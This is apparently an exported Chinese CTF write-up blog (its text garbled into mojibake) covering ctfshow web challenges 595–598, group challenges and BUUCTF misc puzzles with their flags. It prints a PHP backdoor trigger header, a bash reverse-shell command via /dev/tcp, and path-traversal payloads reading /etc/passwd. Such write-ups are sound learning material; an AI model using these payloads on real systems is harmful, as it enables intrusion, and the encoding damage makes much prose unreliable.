<h1 id="WEB595"><a href="#WEB595" class="headerlink" title="WEB595"></a>WEB595</h1><p>åŸå‹ä¸ºPHPå®˜æ–¹GITæœåŠ¡å™¨è¿‘æ—¥è¢«æ¤å…¥çš„åé—¨ã€‚<br>é¦–å…ˆï¼Œåé—¨ç¨‹åºä¼šæ£€æµ‹httpå¤´æ˜¯å¦å«æœ‰User-Agentt(ä¸æ˜¯User-Agentï¼Œå¤šäº†ä¸€ä¸ªt)ã€‚<br>å¦‚æœå­˜åœ¨ï¼Œåˆ¤æ–­å®ƒçš„å€¼æ˜¯å¦å«æœ‰zerodiumå­—ç¬¦ä¸²ï¼Œä½œä¸ºè§¦å‘åé—¨çš„â€œå£ä»¤â€ã€‚<br>å¦‚æœæ ‡ç¤ºå­˜åœ¨ï¼Œä»User-Agenttå€¼çš„ç¬¬8ä¸ªå­—èŠ‚èµ·åˆ°ç»“å°¾æå–å­—ç¬¦ä¸²ä½œä¸ºä»£ç ï¼ˆå‰8ä¸ªå­—ç¬¦ä¸ºzerodiumï¼‰ï¼Œè¿›è¡Œç¼–è¯‘æ‰§è¡Œï¼Œå¦‚åŒevalå‡½æ•°æ•ˆæœã€‚<br>æŠ“åŒ…æ”¹æŠ¥æ–‡å³å¯æ‰§è¡Œå‘½ä»¤ï¼š<br>User-Agentt: zerodiumsystem(â€˜ls &#x2F;â€˜);<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web595-1.png"></p>
<h1 id="WEB596"><a href="#WEB596" class="headerlink" title="WEB596"></a>WEB596</h1><p>Python PIL è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆGhostButt ï¼‰<br>Pythonä¸­å¤„ç†å›¾ç‰‡çš„æ¨¡å—PILï¼ˆPillowï¼‰ï¼Œå› ä¸ºå…¶å†…éƒ¨è°ƒç”¨äº†GhostScriptè€Œå—åˆ°GhostButtæ¼æ´ï¼ˆCVE-2017-8291ï¼‰çš„å½±å“ï¼Œé€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªä¸Šä¼ é¡µé¢ã€‚æ­£å¸¸åŠŸèƒ½æ˜¯æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªPNGæ–‡ä»¶ï¼Œåç«¯è°ƒç”¨PILåŠ è½½å›¾ç‰‡ï¼Œè¾“å‡ºé•¿å®½ã€‚ä½†æˆ‘ä»¬å¯ä»¥å°†å¯æ‰§è¡Œå‘½ä»¤EPSæ–‡ä»¶åç¼€æ”¹æˆPNGè¿›è¡Œä¸Šä¼ ï¼Œå› ä¸ºåç«¯æ˜¯æ ¹æ®æ–‡ä»¶å¤´æ¥åˆ¤æ–­å›¾ç‰‡ç±»å‹ï¼Œæ‰€ä»¥æ— è§†åç¼€æ£€æŸ¥ã€‚</p>
<p>æ¯”å¦‚<a href="https://github.com/vulhub/vulhub/blob/master/python/PIL-CVE-2017-8291/poc.png">poc.png</a>ï¼Œæˆ‘ä»¬ä¸Šä¼ ä¹‹ï¼Œå³å¯æ‰§è¡Œtouch &#x2F;tmp&#x2F;aaaaaã€‚å°†POCä¸­çš„å‘½ä»¤æ”¹ä¸ºåå¼¹å‘½ä»¤(bash -c â€œbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1â€)ï¼Œå³å¯è·å¾—shellï¼š<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web596-1.png"></p>
<h1 id="WEB597"><a href="#WEB597" class="headerlink" title="WEB597"></a>WEB597</h1><p>Ruby On Rails è·¯å¾„ç©¿è¶Šæ¼æ´ï¼ˆCVE-2018-3760ï¼‰<br>Ruby On Railsåœ¨å¼€å‘ç¯å¢ƒä¸‹ä½¿ç”¨Sprocketsä½œä¸ºé™æ€æ–‡ä»¶æœåŠ¡å™¨ï¼ŒRuby On Railsæ˜¯è‘—åRuby Webå¼€å‘æ¡†æ¶ï¼ŒSprocketsæ˜¯ç¼–è¯‘åŠåˆ†å‘é™æ€èµ„æºæ–‡ä»¶çš„Rubyåº“ã€‚</p>
<p>Sprockets 3.7.1åŠä¹‹å‰ç‰ˆæœ¬ä¸­ï¼Œå­˜åœ¨ä¸€å¤„å› ä¸ºäºŒæ¬¡è§£ç å¯¼è‡´çš„è·¯å¾„ç©¿è¶Šæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨%252e%252e&#x2F;æ¥è·¨è¶Šåˆ°æ ¹ç›®å½•ï¼Œè¯»å–æˆ–æ‰§è¡Œç›®æ ‡æœåŠ¡å™¨ä¸Šä»»æ„æ–‡ä»¶ã€‚</p>
<p>ç›´æ¥è®¿é—®IP&#x2F;assets&#x2F;file:%2f%2f&#x2F;etc&#x2F;passwdï¼Œå°†ä¼šæŠ¥é”™ï¼Œå› ä¸ºæ–‡ä»¶&#x2F;etc&#x2F;passwdä¸åœ¨å…è®¸çš„ç›®å½•ä¸­ï¼š<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web597-1.png"><br>åœ¨ä¸Šæ–¹çš„æŠ¥é”™ä¸­éšæ„é€‰æ‹©ä¸€ä¸ªè·¯å¾„åˆ©ç”¨..&#x2F;è¿”å›ä¸Šä¸€çº§ï¼ŒæˆåŠŸå®ç°ä»»æ„æ–‡ä»¶è¯»å–<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web597-2.png"></p>
<h1 id="WEB598"><a href="#WEB598" class="headerlink" title="WEB598"></a>WEB598</h1><p>Ruby on Rails è·¯å¾„ç©¿è¶Šä¸ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼ˆCVE-2019-5418ï¼‰</p>
<p>åœ¨æ§åˆ¶å™¨ä¸­é€šè¿‡render fileå½¢å¼æ¥æ¸²æŸ“åº”ç”¨ä¹‹å¤–çš„è§†å›¾ï¼Œä¸”ä¼šæ ¹æ®ç”¨æˆ·ä¼ å…¥çš„Acceptå¤´æ¥ç¡®å®šæ–‡ä»¶å…·ä½“ä½ç½®ã€‚æˆ‘ä»¬é€šè¿‡ä¼ å…¥&#96;Accept: ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p>
]]></content>
      <categories>
        <category>ctfshow-webå…¥é—¨</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctfshow</tag>
        <tag>webå…¥é—¨</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€ctfshowã€‘ç¾¤å‹æŒ‘æˆ˜-wp</title>
    <url>/posts/37dc4cfa/</url>
    <content><![CDATA[<h1 id="CTFshowç¦åˆ©æŠ½å¥–"><a href="#CTFshowç¦åˆ©æŠ½å¥–" class="headerlink" title="CTFshowç¦åˆ©æŠ½å¥–"></a>CTFshowç¦åˆ©æŠ½å¥–</h1><p>å¥½å®¶ä¼™ï¼Œæ‰“å¼€å®¹å™¨å°±æ˜¯flagï¼Œä½†æ˜¯ç¾¤ä¸»æŠŠæäº¤çš„æ¡†éšè—äº†<br><img src="/img/ctfshow/%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98-1.png"></p>
<p>è§‚å¯ŸURLä¸­çš„æ•°å­—ï¼Œå‘ç°è¿™ä¸€é¢˜çš„valueæ˜¯1089<br><img src="/img/ctfshow/%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98-2.png"></p>
<p>æ‰“å¼€å…¶ä»–ä»»æ„ä¸€é¢˜ï¼Œä¿®æ”¹challenge-idçš„valueå€¼ï¼Œæäº¤æˆåŠŸ<br><img src="/img/ctfshow/%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98-3.png"></p>
<h1 id="æŸåçš„æ–‡ä»¶"><a href="#æŸåçš„æ–‡ä»¶" class="headerlink" title="æŸåçš„æ–‡ä»¶"></a>æŸåçš„æ–‡ä»¶</h1><p>stegsolveä¸€æŠŠæ¢­ï¼Œå¦å­˜ä¸ºpngæ–‡ä»¶ï¼Œflagå°±åœ¨å›¾ç‰‡ä¸Š<br><img src="/img/ctfshow/%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98-4.png"></p>
<h1 id="å¯»æ‰¾åæ ‡"><a href="#å¯»æ‰¾åæ ‡" class="headerlink" title="å¯»æ‰¾åæ ‡"></a>å¯»æ‰¾åæ ‡</h1><blockquote>
<p>è¿™å¼ å›¾ç‰‡é‡Œé¢éšè—äº†NASAçš„å‘åŠ¨æœºå®éªŒå®¤åæ ‡ï¼Œä½ èƒ½æ‰¾å‡ºæ¥å—ï¼Ÿ</p>
</blockquote>
<blockquote>
<p>åæ ‡è¯·åˆ é™¤éå­—æ¯å’Œæ•°å­—çš„ç¬¦å·ï¼Œå­—æ¯å…¨éƒ¨å¤§å†™ flagæ ¼å¼ä¸ºctfshow{NASAå‘åŠ¨æœºå®éªŒå®¤åæ ‡}</p>
</blockquote>
<p>ç›´æ¥è°·æ­Œåˆ°<a href="https://supercodepower.com/NASA-parachute-binary">åæ ‡</a></p>
<h1 id="å¯Œå©†æˆ‘æ¥äº†"><a href="#å¯Œå©†æˆ‘æ¥äº†" class="headerlink" title="å¯Œå©†æˆ‘æ¥äº†"></a>å¯Œå©†æˆ‘æ¥äº†</h1><p>æ ¹æ®æç¤ºï¼Œåœ¨ç¾¤æ–‡ä»¶ä¸‹è½½æ–‡ä»¶<br><img src="/img/ctfshow/%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98-5.png"></p>
<p>å°†é™„ä»¶å†…å®¹ä¸ç¾¤æ–‡ä»¶å†…å®¹ä¸€ä¸€å¯¹åº”ï¼Œæ‰¾åˆ°ä¸­æ–‡å³å¯</p>
<blockquote>
<p>214,1â€”&gt;æˆ‘<br>221,7â€”&gt;ä¹Ÿ<br>233,35â€”&gt;æƒ³<br>15,45â€”&gt;æ‰¾<br>65,67â€”&gt;ä¸‰<br>57,37â€”&gt;å<br>115,27â€”&gt;å…­<br>229,8â€”&gt;è¿ª<br>232,27â€”&gt;çš„<br>101,48â€”&gt;å¯Œ<br>124,94â€”&gt;å©†</p>
</blockquote>
<h1 id="FWæˆ‘æ¥äº†"><a href="#FWæˆ‘æ¥äº†" class="headerlink" title="FWæˆ‘æ¥äº†"></a>FWæˆ‘æ¥äº†</h1><p>notepad++æˆ–å…¶ä»–ç¼–è¾‘å™¨æ‰“å¼€</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[&#123;000214A0-0000-0000-C000-000000000046&#125;]</span><br><span class="hljs-attr">Prop3</span>=<span class="hljs-number">19</span>,<span class="hljs-number">2</span><br><span class="hljs-section">[InternetShortcut]</span><br><span class="hljs-attr">Modified</span>=<span class="hljs-number">63746673686</span>f777b666c61675f69735f6c6f76657d<br><span class="hljs-attr">IconFile</span>=C:\WINDOWS\system32\SHELL32.dll<br><span class="hljs-attr">IconIndex</span>=<span class="hljs-number">10</span><br><span class="hljs-attr">IDList</span>=<br><span class="hljs-attr">URL</span>=https://ctf.show/<br></code></pre></td></tr></table></figure>

<p>å°†modifiedçš„å€¼è½¬å­—ç¬¦ä¸²å³å¯</p>
<h1 id="ç—…æ¯’æˆ‘æ¥äº†"><a href="#ç—…æ¯’æˆ‘æ¥äº†" class="headerlink" title="ç—…æ¯’æˆ‘æ¥äº†"></a>ç—…æ¯’æˆ‘æ¥äº†</h1><p>è§£å‹åç›´æ¥ç”¨010æˆ–è€…stringså¯ä»¥çœ‹åˆ°flagå°±åœ¨æœ€åï¼Œä¸è¿‡æ˜¯16è¿›åˆ¶çš„ï¼Œè½¬æˆå­—ç¬¦ä¸²å³å¯</p>
<h1 id="æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº"><a href="#æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº" class="headerlink" title="æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº"></a>æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº</h1><p>MD5ç­‰äºè‡ªèº«ï¼Œå¦‚md5($a)&#x3D;&#x3D;$a,phpå¼±æ¯”è¾ƒä¼šæŠŠ0eå¼€å¤´è¯†åˆ«ä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œç»“æœå‡ä¸º0ï¼Œæ‰€ä»¥æ­¤æ—¶éœ€è¦æ‰¾åˆ°ä¸€ä¸ªMD5åŠ å¯†å‰åéƒ½æ˜¯0eå¼€å¤´çš„ï¼Œå¦‚0e215962017<br><img src="/img/ctfshow/%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98-6.png"></p>
<h1 id="è§£é¢˜å§¬02"><a href="#è§£é¢˜å§¬02" class="headerlink" title="è§£é¢˜å§¬02"></a>è§£é¢˜å§¬02</h1><p>å¾ˆæœ‰æ„æ€çš„ä¸€é¢˜</p>
<p>ä½¿ç”¨mumuziè§£é¢˜å§¬è„šæœ¬è‡ªåŠ¨è§£é¢˜</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> mumuzi <span class="hljs-keyword">import</span> mumuzi<br><br>taoshen=mumuzi()<br>f=<span class="hljs-string">&#x27;flag.tao6000000&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60000</span>):<br>    taoshen.talk()<br>    f=taoshen.solve(f)<br></code></pre></td></tr></table></figure>

<p><img src="/img/ctfshow/%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98-7.png"></p>
<p>å¾—åˆ°ä¸€ä¸ª<code>flag.layer5999880</code></p>
<p>å–å‡ºå…¶ä¸­çš„raræ–‡ä»¶ï¼Œåœ¨æ³¨é‡Šä¸­å‘ç°hint</p>
<p><img src="/img/ctfshow/%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98-8.png"></p>
<p>æ‰¾åˆ°æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´ä¸º<code>2021/10/23 7:08</code></p>
<p>å¾€å‰æ¨ä¸€ä¸ªæœˆå°±æ˜¯<code>2021/09/23</code></p>
<p>åœ¨pypiä¸Šæ‰¾è¿™å¤©çš„ç‰ˆæœ¬ï¼Œæœ‰<code>0.1.0-0.1.4</code>äº”ä¸ªç‰ˆæœ¬</p>
<p>æœ€ç»ˆåœ¨<code>0.1.3</code>ç‰ˆæœ¬çš„<code>taoshenyulu.py</code>å¾—åˆ°flag</p>
<h1 id="TH185"><a href="#TH185" class="headerlink" title="TH185"></a>TH185</h1><p>ä¸€è„¸æ‡µé€¼ï¼Œå®Œå…¨çœ‹ä¸æ‡‚é¢˜ç›®ï¼ŒäºŒåˆºèˆæµ“åº¦å¤ªé«˜äº†</p>
<p>åœ¨é¢˜ç›®ç»™å‡ºçš„wikiä¸­çˆ†ç ´+çŒœ æ‹¿åˆ°flagï¼ˆå› ä¸ºä¾‹å­ç»™çš„æ˜¯<code>CLASSICLAGER</code>ï¼Œé‚£å°±çˆ†ç ´ç±»ä¼¼çš„å­—ç¬¦ä¸²ï¼Œå¾—åˆ°<code>ASAHIMARUEFU</code>ï¼‰</p>
<p><img src="/img/ctfshow/%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98-9.png"></p>
<p>æœªå®Œå¾…ç»­ã€‚ã€‚ã€‚</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€buuctfã€‘misc-page3</title>
    <url>/posts/63027cae/</url>
    <content><![CDATA[<h1 id="HBNIS2018-caesar"><a href="#HBNIS2018-caesar" class="headerlink" title="[HBNIS2018]caesar"></a>[HBNIS2018]caesar</h1><p>å‡¯æ’’åŠ å¯†ï¼Œæšä¸¾ä¸€ä¸‹å¾—åˆ°flag</p>
<blockquote>
<p>flag{flagiscaesar}</p>
</blockquote>
<h1 id="SWPU2019-ä½ æœ‰æ²¡æœ‰å¥½å¥½çœ‹ç½‘è¯¾"><a href="#SWPU2019-ä½ æœ‰æ²¡æœ‰å¥½å¥½çœ‹ç½‘è¯¾" class="headerlink" title="[SWPU2019]ä½ æœ‰æ²¡æœ‰å¥½å¥½çœ‹ç½‘è¯¾?"></a>[SWPU2019]ä½ æœ‰æ²¡æœ‰å¥½å¥½çœ‹ç½‘è¯¾?</h1><p>è§£å‹å¾—åˆ°flag2.zipå’Œflag3.zip<br>flag3.zipçš„æ³¨é‡Šä¸­æç¤ºäº†6ä½æ•°å­—çˆ†ç ´ï¼Œ<code>183792</code><br>å¾—åˆ°flag.docxå’Œå½± æµ ä¹‹ ä¸».mp4</p>
<p>é€šè¿‡<code>docx</code>ä¸­çš„hint<code>5.20</code>å’Œ<code>7.11</code>å‘ç°<br><code>mp4</code>çš„<code>5.67</code>ç§’å­˜åœ¨æ•²å‡»ç <code>..... ../... ./... ./... ../</code>ï¼Œ<code>7.37</code>ç§’å­˜åœ¨å­—ç¬¦ä¸²<code>dXBfdXBfdXA=</code></p>
<p>è§£å¯†å¾—åˆ°<code>wllmup_up_up</code></p>
<p>flagåœ¨è§£å‹å‡ºçš„å›¾ç‰‡å°¾éƒ¨</p>
<blockquote>
<p>flag{A2e_Y0u_Ok?}</p>
</blockquote>
<h1 id="SUCTF2018-single-dog"><a href="#SUCTF2018-single-dog" class="headerlink" title="[SUCTF2018]single dog"></a>[SUCTF2018]single dog</h1><p>binwalkåˆ†ç¦»å‡ºä¸€ä¸ªtxtï¼Œ<code>aaencode</code>è§£å¯†å¾—åˆ°flag</p>
<blockquote>
<p>flag{happy double eleven}</p>
</blockquote>
<h1 id="æˆ‘åƒä¸‰æ˜æ²»"><a href="#æˆ‘åƒä¸‰æ˜æ²»" class="headerlink" title="æˆ‘åƒä¸‰æ˜æ²»"></a>æˆ‘åƒä¸‰æ˜æ²»</h1><p>flagè—åœ¨ä¸¤å¼ å›¾ç‰‡çš„ä¸­é—´ï¼Œbase64è§£ä¸€ä¸‹å³å¯</p>
<blockquote>
<p>flag{6f1797d4080b29b64da5897780463e30}</p>
</blockquote>
<h1 id="ACTFæ–°ç”Ÿèµ›2020-NTFSæ•°æ®æµ"><a href="#ACTFæ–°ç”Ÿèµ›2020-NTFSæ•°æ®æµ" class="headerlink" title="[ACTFæ–°ç”Ÿèµ›2020]NTFSæ•°æ®æµ"></a>[ACTFæ–°ç”Ÿèµ›2020]NTFSæ•°æ®æµ</h1><p>ntfsæµéšå†™</p>
<blockquote>
<p>flag{AAAds_nntfs_ffunn?}</p>
</blockquote>
<h1 id="john-in-the-middle"><a href="#john-in-the-middle" class="headerlink" title="john-in-the-middle"></a>john-in-the-middle</h1><p>å…ˆå°†æ‰€æœ‰å›¾ç‰‡æå–å‡ºæ¥ï¼Œstegsolveè§‚å¯Ÿå…¶ä¸­ä¸€å¼ æ—¶å‘ç°flag</p>
<blockquote>
<p>flag{J0hn_th3_Sn1ff3r}</p>
</blockquote>
<h1 id="å–µå–µå–µ"><a href="#å–µå–µå–µ" class="headerlink" title="å–µå–µå–µ"></a>å–µå–µå–µ</h1><h1 id="ACTFæ–°ç”Ÿèµ›2020-swp"><a href="#ACTFæ–°ç”Ÿèµ›2020-swp" class="headerlink" title="[ACTFæ–°ç”Ÿèµ›2020]swp"></a>[ACTFæ–°ç”Ÿèµ›2020]swp</h1><p>foremoståˆ†ç¦»<code>wget.pcapng</code>ï¼Œå¾—åˆ°ä¸€ä¸ªä¼ªåŠ å¯†çš„å‹ç¼©åŒ…ï¼Œ7-zipç›´æ¥è§£å‹ï¼Œè™½ç„¶æç¤ºå¤±è´¥ä½†è¿˜æ˜¯ä¼šå¾—åˆ°ä¸€ä¸ª<code>.flag.swp</code></p>
<blockquote>
<p>flag{c5558bcf-26da-4f8b-b181-b61f3850b9e5}</p>
</blockquote>
<h1 id="GXYCTF2019-SXMgdGhpcyBiYXNlPw-x3D-x3D"><a href="#GXYCTF2019-SXMgdGhpcyBiYXNlPw-x3D-x3D" class="headerlink" title="[GXYCTF2019]SXMgdGhpcyBiYXNlPw&#x3D;&#x3D;"></a>[GXYCTF2019]SXMgdGhpcyBiYXNlPw&#x3D;&#x3D;</h1><p>base64æµåŠ å¯†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#base64è§£ç è„šæœ¬ï¼ŒPython2 è¿è¡Œ</span><br><br>b64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><br><span class="hljs-comment"># 2.txtä¸ºéœ€è¦è§£ç çš„æ–‡ä»¶</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():<br>        stegb64 = <span class="hljs-string">&#x27;&#x27;</span>.join(line.split())<br>        rowb64 =  <span class="hljs-string">&#x27;&#x27;</span>.join(stegb64.decode(<span class="hljs-string">&#x27;base64&#x27;</span>).encode(<span class="hljs-string">&#x27;base64&#x27;</span>).split())<br>        offset = <span class="hljs-built_in">abs</span>(b64chars.index(stegb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>])-b64chars.index(rowb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>]))<br>        equalnum = stegb64.count(<span class="hljs-string">&#x27;=&#x27;</span>) <span class="hljs-comment">#no equalnum no offset</span><br>        <span class="hljs-keyword">if</span> equalnum:<br>            bin_str += <span class="hljs-built_in">bin</span>(offset)[<span class="hljs-number">2</span>:].zfill(equalnum * <span class="hljs-number">2</span>)<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>)]) <span class="hljs-comment">#8ä½ä¸€ç»„</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>flag{fazhazhenhaoting}</p>
</blockquote>
<h1 id="Mysterious"><a href="#Mysterious" class="headerlink" title="Mysterious"></a>Mysterious</h1><p>shift+f12æœç´¢å­—ç¬¦ä¸²ï¼Œå®šä½åˆ°ä¸»è¦å‡½æ•°å¤„</p>
<p><img src="/img/buuctf/buu-misc-page3-1.jpg"></p>
<p>æ ¹æ®æ¡ä»¶ï¼Œè¦æ»¡è¶³ç¬¬å››äº”å…­ä½æ˜¯<code>xyz</code>ï¼Œæ€»ä½“ä¸èƒ½è¶…è¿‡6ä½ï¼Œ<code>v4</code>è¢«<code>atoi()</code>å‡½æ•°è½¬ä¸ºæ•°å­—æ•´å‹å¹¶ä¸”<code>+1</code>ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªåº”è¯¥è¾“å…¥<code>122</code></p>
<p>åˆåœ¨ä¸€èµ·è¾“å…¥<code>122xyz</code>å¾—åˆ°flag</p>
<blockquote>
<p>flag{123_Buff3r_0v3rf|0w}</p>
</blockquote>
<h1 id="é—´è°å¯ç¤ºå½•"><a href="#é—´è°å¯ç¤ºå½•" class="headerlink" title="é—´è°å¯ç¤ºå½•"></a>é—´è°å¯ç¤ºå½•</h1><p>foremoståˆ†ç¦»isoæ–‡ä»¶ï¼Œè§£å‹raråè¿è¡Œflag.exeå¾—åˆ°<code>æœºå¯†æ–‡ä»¶.txt</code></p>
<blockquote>
<p>flag{379:7b758:g7dfe7f19:9464f:4g9231}</p>
</blockquote>
<h1 id="UTCTF2020-docx"><a href="#UTCTF2020-docx" class="headerlink" title="[UTCTF2020]docx"></a>[UTCTF2020]docx</h1><p>å°†æ–‡ä»¶åç¼€æ”¹ä¸ºzipè§£å‹ï¼Œåœ¨<code>media</code>ç›®å½•ä¸‹å¾—åˆ°åŒ…å«<code>flag</code>çš„å›¾ç‰‡</p>
<blockquote>
<p>flag{unz1p_3v3ryth1ng}</p>
</blockquote>
<h1 id="å¼±å£ä»¤"><a href="#å¼±å£ä»¤" class="headerlink" title="å¼±å£ä»¤"></a>å¼±å£ä»¤</h1><p>æ³¨é‡Šä¸­æœ‰ä¸œè¥¿ï¼Œ<code>tab</code>è½¬<code>-</code>ï¼Œç©ºæ ¼è½¬<code>.</code>ï¼Œæ‘©æ–¯è§£å¯†å¾—åˆ°<code>HELL0FORUM</code></p>
<p>lsbéšå†™ï¼Œå¯†ç æ˜¯<code>123456</code></p>
<p><img src="/img/buuctf/buu-misc-page3-2.png"></p>
<blockquote>
<p>flag{jsy09-wytg5-wius8}</p>
</blockquote>
<h1 id="RoarCTF2019-é»„é‡‘6å¹´"><a href="#RoarCTF2019-é»„é‡‘6å¹´" class="headerlink" title="[RoarCTF2019]é»„é‡‘6å¹´"></a>[RoarCTF2019]é»„é‡‘6å¹´</h1><p>æŸäº›ä¹¦ä¸Šæœ‰äºŒç»´ç ï¼Œæ‰«ç æ‹¼æ¥åå¾—åˆ°<code>iwantplayctf</code></p>
<p>mp4æ–‡ä»¶ç»“å°¾å¾—åˆ°ä¸€ä¸²base64å­—ç¬¦ä¸²ï¼Œè§£ç åå¾—åˆ°ä¸€ä¸ªraræ–‡ä»¶</p>
<p>ç”¨äºŒç»´ç ä¸­çš„å¯†ç è§£å‹å¾—åˆ°flag</p>
<blockquote>
<p>flag{CTF-from-RuMen-to-RuYuan}</p>
</blockquote>
<h1 id="å°æ˜“çš„Uç›˜"><a href="#å°æ˜“çš„Uç›˜" class="headerlink" title="å°æ˜“çš„Uç›˜"></a>å°æ˜“çš„Uç›˜</h1><p>foremostè§£å‹åå¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…<br>æŸ¥çœ‹<code>autorun.inf</code>æ–‡ä»¶ï¼Œå‘ç°æŒ‡å‘äº†<code>autoflag - å‰¯æœ¬ (32)</code><br>idaæ‰“å¼€å°±æ˜¯flag</p>
<blockquote>
<p>flag{29a0vkrlek3eu10ue89yug9y4r0wdu10}</p>
</blockquote>
<h1 id="WUSTCTF2020-alison-likes-jojo"><a href="#WUSTCTF2020-alison-likes-jojo" class="headerlink" title="[WUSTCTF2020]alison_likes_jojo"></a>[WUSTCTF2020]alison_likes_jojo</h1><p><code>foremost</code>åˆ†ç¦»<code>boki.jpg</code>ï¼Œå¾—åˆ°ä¸€ä¸ªzip</p>
<p>çˆ†ç ´å¯†ç ï¼Œçº¯æ•°å­—<code>888866</code></p>
<p>txtä¸­çš„å†…å®¹æ•°å±‚base64è§£å¯†å¾—åˆ°<code>killerqueen</code></p>
<p>outguesséšå†™<br><code>outguess -r ../jljy.jpg -t 123.txt -k killerqueen</code></p>
<blockquote>
<p>flag{pretty_girl_alison_likes_jojo}</p>
</blockquote>
<h1 id="å®‰æ´µæ¯-2019-å¹ç€è´æ–¯æ‰«äºŒç»´ç "><a href="#å®‰æ´µæ¯-2019-å¹ç€è´æ–¯æ‰«äºŒç»´ç " class="headerlink" title="[å®‰æ´µæ¯ 2019]å¹ç€è´æ–¯æ‰«äºŒç»´ç "></a>[å®‰æ´µæ¯ 2019]å¹ç€è´æ–¯æ‰«äºŒç»´ç </h1><h1 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h1><p>ä¸‹è½½é™„ä»¶ï¼Œè§£å‹å¾—åˆ°<code>68</code>ä¸ªå‹ç¼©åŒ…ï¼Œå¹¶ä¸”æ¯ä¸ªå‹ç¼©æ–‡ä»¶é‡Œéƒ½æœ‰ä¸€ä¸ª<code>4</code>ä¸ªå­—èŠ‚å¤§å°çš„åä¸º<code>data.txt</code>çš„<code>txt</code>æ–‡ä»¶ï¼Œäºæ˜¯å°è¯•ç”¨<code>crc32</code>ç¢°æ’è¿˜åŸå‡ºæ‰€æœ‰å‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶å†…å®¹</p>
<p>å¾—åˆ°<br><code>z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==</code></p>
<p>è§£ç åçœ‹åˆ°æç¤º:<code>fix the file and get the flag</code></p>
<p>æ·»åŠ rarå¤´<code>52 61 72 21 1A 07 00</code>ï¼Œåœ¨æ³¨é‡Šä¸­çœ‹åˆ°flag</p>
<blockquote>
<p>flag{nev3r_enc0de_t00_sm4ll_fil3_w1th_zip}</p>
</blockquote>
<h1 id="GUET-CTF2019-zips"><a href="#GUET-CTF2019-zips" class="headerlink" title="[GUET-CTF2019]zips"></a>[GUET-CTF2019]zips</h1><p>å…ˆçº¯æ•°å­—çˆ†ç ´ï¼Œå¾—åˆ°å¯†ç <code>723456</code></p>
<p>ä¼ªåŠ å¯†å¾—åˆ°<code>setup.sh</code></p>
